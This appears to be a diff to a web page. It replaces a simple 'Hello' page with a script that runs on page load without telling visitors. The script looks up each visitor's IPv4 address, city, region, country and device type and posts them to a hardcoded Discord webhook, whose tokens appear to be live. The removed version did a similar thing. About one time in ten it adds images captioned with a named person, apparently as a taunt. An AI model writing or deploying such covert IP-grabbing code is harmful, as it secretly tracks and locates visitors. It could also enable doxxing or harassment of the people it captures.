@@ -1,77 +1,91 @@
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Hello</title>
-  <style>
-    html, body {
-      margin: 0;
-      height: 100%;
-      background: #ffffff;
-      color: #000000;
-      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+
+<script>
+  // Paste your Discord webhook URL between the quotes below.
+  var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1569104672646627378/7fmslZUsJXlTYb-K2mF7ArY7m5bUIepCmjnWD-zCgCIKKyoj8XOu9uSdMOfutdnB3uwF";
+
+  (function notifyVisit() {
+    if (!DISCORD_WEBHOOK_URL ||
+        DISCORD_WEBHOOK_URL.indexOf("discord.com/api/webhooks/") === -1) {
+      return;
     }
 
-    body {
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    function deviceType() {
+      var ua = navigator.userAgent || "";
+      if (/iPhone/i.test(ua)) return "iPhone";
+      if (/iPad/i.test(ua)) return "iPad";
+      if (/Android/i.test(ua)) return "Android";
+      return "PC";
     }
-  </style>
-</head>
-<body>
-  <h1>Hello</h1>
 
-  <script>
-    // Paste your regenerated Discord webhook URL here.
-    var DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1568907828360384533/9ZTp4Ml-FQa5qjKzEw7jyv_dNNbymX_ibd99ikjbaB4oHKlvuMrnOZWDRy9oVNv9kEL8";
+    function boxed(lines) {
+      var width = 0;
+      lines.forEach(function (l) {
+        if (l.length > width) width = l.length;
+      });
 
-    (function notifyVisit() {
-      if (
-        !DISCORD_WEBHOOK_URL ||
-        DISCORD_WEBHOOK_URL.indexOf("discord.com/api/webhooks/") === -1
-      ) {
-        return;
+      function pad(l) {
+        return "║ " + l +
+          new Array(width - l.length + 1).join(" ") + " ║";
       }
 
-      var userAgent = navigator.userAgent || "unknown";
+      var top = "╔" + new Array(width + 3).join("═") + "╗";
+      var bottom = "╚" + new Array(width + 3).join("═") + "╝";
 
-      function send(ip) {
-        var message =
-          "**New visit**\n" +
-          "IPv4: " + ip + "\n" +
-          "Browser: " + userAgent;
+      return "```\n" + top + "\n" +
+        lines.map(pad).join("\n") +
+        "\n" + bottom + "\n```";
+    }
 
-        fetch(DISCORD_WEBHOOK_URL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            content: message
-          })
-        }).catch(function (e) {
-          console.error("Discord notification failed:", e);
+    var GARY_IMAGES = [
+      "https://cdn.discordapp.com/attachments/1202087166709350501/1568888076019703838/image.png?ex=6af17461&is=6af022e1&hm=b0309f6b654c31105db31d02d531f94c2f4c1830cb4342b6599a1f313f0c9bec&",
+      "https://cdn.discordapp.com/attachments/1202087166709350501/1568888442178244628/image.png?ex=6af174b9&is=6af02339&hm=720176c676c4d4fd3a9bab88bd38f1c209ceb3c8585a74b197ceded67ebf8dbf&"
+    ];
+
+    function send(ip, city, state, country) {
+      var message = boxed([
+        "IPv4:    " + ip,
+        "City:    " + city,
+        "State:   " + state,
+        "Country: " + country,
+        "Device:  " + deviceType()
+      ]);
+
+      var payload = { content: message };
+
+      if (Math.floor(Math.random() * 10) === 0) {
+        payload.content = message + "\nGary Minter";
+        payload.embeds = GARY_IMAGES.map(function (url) {
+          return { image: { url: url } };
         });
       }
 
-      // IPv4-only lookup
-      fetch("https://api4.ipify.org?format=json")
-        .then(function (r) {
-          if (!r.ok) throw new Error("IPv4 lookup failed");
-          return r.json();
-        })
-        .then(function (data) {
-          send(data.ip || "unknown");
-        })
-        .catch(function () {
-          send("IPv4 unavailable");
-        });
-    })();
-  </script>
-</body>
-</html>
-```
-    
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(function () {});
+    }
+
+    // IPv4-only lookup endpoint.
+    fetch("https://ipv4.ipwho.is/")
+      .then(function (r) {
+        if (!r.ok) throw new Error("IPv4 lookup failed");
+        return r.json();
+      })
+      .then(function (data) {
+        if (!data.ip || !/^\d{1,3}(\.\d{1,3}){3}$/.test(data.ip)) {
+          throw new Error("Not a valid IPv4 address");
+        }
+
+        send(
+          data.ip,
+          data.city || "unknown",
+          data.region || "unknown",
+          data.country || "unknown"
+        );
+      })
+      .catch(function () {
+        send("unknown", "unknown", "unknown", "unknown");
+      });
+  })();
+</script>
